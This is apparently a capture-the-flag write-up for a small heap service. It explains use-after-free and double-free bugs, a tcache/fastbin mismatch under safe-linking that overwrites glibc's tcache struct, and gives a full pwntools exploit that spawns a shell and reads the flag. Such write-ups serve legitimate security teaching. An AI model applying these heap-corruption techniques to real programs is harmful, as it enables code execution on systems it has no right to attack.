## Challenge overview
The challenge is a tiny heap service with 4 operations:
 - `create`
 - `update`
 - `delete`
 - `copy`

and a hidden `win()` behind choice `5`:

```c
void win() {
	if (*admin == 0xdeadbeefdeadcafe) {
		puts("good boy");
		system("/bin/sh");
	} else 
		die("admin");
}
```

`admin` is especially interesting because it is mmapped at a fixed address:

```c
admin = (unsigned long*) mmap((void*) 0x1337000, 8, PROT_READ | PROT_WRITE,
                              MAP_PRIVATE | MAP_FIXED | MAP_ANON, -1, 0);
```

So the whole challenge boils down to writing `0xdeadbeefdeadcafe` at `0x1337000`.

The bugs are also pretty obvious:

```c
void update() {
	unsigned int idx;

	idx = get_idx();

	printf("enter %d bytes: ", sizes[idx]);
	read_exactly(STDIN_FILENO, ptrs[idx], sizes[idx]);
}

void delete() {
	unsigned int idx;

	idx = get_idx();
	free(ptrs[idx]);
}

void copy() {
	unsigned int dest;
	unsigned int src;

	dest = get_idx();
	src = get_idx();

	memcpy(ptrs[dest], ptrs[src], min(sizes[dest], sizes[src]));
}
```

No nulling after free, no state tracking, and `copy()` happily memcpy's between freed chunks. <br>
So we get **UAF**, **double free** and UAF **read/write** all at once.

## The primitive
The whole exploit is built around a small difference between **tcache** and **fastbin**:
 - in **tcache**, the mangled `next` points exactly to the user pointer returned by `malloc()`;
 - in **fastbin**, the mangled `fd` points to the chunk header, so effectively `0x10` bytes before the tcache view.

If a chunk is already sitting in **tcache** and we free it again while the corresponding tcache bin is full, glibc links it into **fastbin**. <br>
The pointer stored in the chunk gets rewritten with the fastbin encoding, but the chunk is still present in the tcache freelist.

Later, when tcache serves that entry, it interprets the fastbin pointer as a tcache one and returns it as-is. <br>
This gives a chunk pointer shifted back by `0x10`, what I will call a **lifted** chunk.

Getting the first lifted chunk is standard:
 - allocate 8 chunks of size `0x10`;
 - free 7 of them into tcache and the last one into fastbin;
 - zero out one freed tcache entry with `update()` to clear the tcache key;
 - free it again so it lands in fastbin too;
 - drain the bin until tcache eventually returns the corrupted pointer.

If we do this on the very first heap chunk, the lifted allocation lands on top of its header, i.e. right next to the `tcache_perthread_struct` at the beginning of the heap.

## Lifting twice
One lift is not enough. <br>
The first lifted pointer only lands on the first chunk header; to actually overwrite the `tcache_perthread_struct` we need to lift again.

The problem is that once we free the lifted chunk, glibc no longer sees a real chunk. It sees a fake one whose metadata lives in weird places:
 - the fake chunk `size` is read `0x8` bytes before the lifted pointer;
 - the next chunk `size` is read `0x18` bytes after the real user pointer alias.

So before freeing that fake chunk we need to forge a valid `0x21` size in both places.

One of those locations is especially annoying: it overlaps the last tcache head, the one for size `0x410`. <br>
So the exploit first forges `0x21` there, then uses that qword as the fake chunk size needed for the second lift.

## Forging `0x21` with safe-linking
Take two freed tcache chunks with `next == NULL`, and place them so that their user pointers are exactly `0x21` pages apart. <br>
If the first chunk lives at page index `x`, the second one lives at page index `x + 0x21`. <br>
Because of safe-linking, the stored mangled value is simply:

```c
stored_next = chunk_addr >> 12
```

Now use the UAF `copy()` to copy the first `0x20` bytes from a freed small chunk into a freed `0x410` chunk. <br>
This moves the encoded `next` of the small chunk into the large one.

Let's say:
 - the small chunk stores `small_chunk_addr >> 12 == x`;
 - the `0x410` chunk is at `large_chunk_addr = small_chunk_addr + 0x21000`, so `large_chunk_addr >> 12 == x + 0x21`.

When the large chunk gets allocated back from tcache, glibc demangles its `next` with the large chunk address:

```c
new_head = copied_value ^ (large_chunk_addr >> 12)
         = x ^ (x + 0x21)
```

The goal is making this become `0x21`.

This is where the `+0x21` vs `^0x21` detail matters. <br>
Strictly speaking, the second page index is `x + 0x21`, not `x ^ 0x21`. <br>
However, if the relevant bits of `x` are zero, adding `0x21` does not generate carries, so in that case:

```c
x + 0x21 == x ^ 0x21
```

and therefore:

```c
x ^ (x + 0x21) == x ^ (x ^ 0x21) == 0x21
```

That is exactly the condition exploited here. <br>
If the low bits are wrong, the trick does not give `0x21` at all.

So after reallocating the `0x410` chunk, the corresponding tcache head becomes `0x21`. <br>

## Reaching the tcache struct
At this point the exploit:
 - uses the normal alias of the first chunk to write another `0x21` where the fake next chunk size will be checked;
 - frees the first lifted chunk, which now gets accepted as a fake `0x20` chunk and lands in fastbin;
 - repeats the same tcache/fastbin mismatch with another small chunk still present in tcache.

Because fastbin pointers are `0x10` bytes earlier than tcache pointers, the second mismatch returns a chunk lifted one more time. <br>
This second lifted allocation finally points inside the tail of `tcache_perthread_struct`.

From there the rest is easy:
 - free the real `0x410` chunk into tcache;
 - overwrite the last tcache head with `0x1337000`;
 - allocate a `0x400` chunk and get it returned at the fixed `admin` mapping;
 - write `0xdeadbeefdeadcafe`;
 - call `win()`.

## Full exploit
```py
#!/usr/bin/env python3
from pwn import *
import sys

context.arch = "amd64"
context.terminal = ["pwntools-terminal"]

DOCKER_PORT = 1337
url = sys.argv[1].split(":")

from pwnlib.tubes.tube import tube
tube.s		= tube.send
tube.sa		= tube.sendafter
tube.sl		= tube.sendline
tube.sla	= tube.sendlineafter
tube.r		= tube.recv
tube.ru		= tube.recvuntil
tube.rl		= tube.recvline
tube.rls	= tube.recvlines

aleak = lambda elfname, addr: log.info(f"{elfname} @ 0x{addr:x}")	# addr leak (bases)
vleak = lambda valname, val: log.info(f"{valname}: 0x{val:x}")	# val leak (canary)
bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))
chunks = lambda data, step: [data[i:i+step] for i in range(0, len(data), step)]

GDB_SCRIPT = """
	c
"""

def conn():
	if args.DOCKER:
		return remote("localhost", DOCKER_PORT)
	return remote(url[0], int(url[1]))


def create(io, idx, size):
	io.sla(b"enter your choice: ", b"1")
	io.sla(b"enter index: ", bstr(idx))
	io.sla(b"enter size: ", bstr(size))


def upd(io, idx, data):
	io.sla(b"enter your choice: ", b"2")
	io.sla(b"enter index: ", bstr(idx))
	io.sa(b"bytes: ", data)


def delete(io, idx):
	io.sla(b"enter your choice: ", b"3")
	io.sla(b"enter index: ", bstr(idx))


def cp(io, dst, src):
	io.sla(b"enter your choice: ", b"4")
	io.sla(b"enter index: ", bstr(dst))
	io.sla(b"enter index: ", bstr(src))


def win(io):
	io.sla(b"enter your choice: ", b"5")

def main(io):
	for i in range(8):
		create(io, i, 0x10)
	
	for i in range(7, -1, -1):
		delete(io, i)
	upd(io, 6, b"\0"*0x10)
	delete(io, 6)

	for i in range(9):
		create(io, i, 0x10)

	create(io, 67, 0x20)

	for i in range(106):
		create(io, 255, 0x4f0)
	create(io, 99, 0x400)

	delete(io, 99)
	delete(io, 67)
	cp(io, 99, 67)
	create(io, 99, 0x400)


	for i in range(50, 57):
		create(io, i, 0x10)
	for i in range(50, 57):
		delete(io, i)

	upd(io, 8, flat({8: 0x21}))
	delete(io, 6)
	upd(io, 51, b"\0"*0x10)
	delete(io, 51)
	
	for i in range(7):
		create(io, i, 0x10)
	delete(io, 99)
	upd(io, 6, flat({8: 0x1337000}))

	create(io, 67, 0x400)
	upd(io, 67, flat(0xdeadbeefdeadcafe).ljust(0x400))

	io.sl(b"5")
	io.sl(b"cat flag")
	io.ru(b"TRX{")
	print("TRX{" + io.ru(b"}").decode())
	return True

if __name__ == "__main__":
	while True:
		try:
			io = conn()
			if main(io):
				break
		except:
			io.close()
			continue
```
This exploit is 25% reliable. <br>

There were also a couple of unintended: <br>
The first one is a simple tcache stashing unlink attack + large bin attack to make the first house possible; and the other one is abusing the xor trick on non-NULL nexts to toggle bits in the pointer, in situations where `x^y == x-y` (if the relevant bits are 1), this allows an attacker to force a chunk to end up in the tcache struct.
